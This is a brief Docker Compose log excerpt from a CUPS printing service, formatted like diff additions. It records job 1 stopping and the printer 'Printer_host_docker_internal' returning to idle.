+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Job ID: 1
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Job State: job-stopped
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Job is processing: No
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed to idle.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
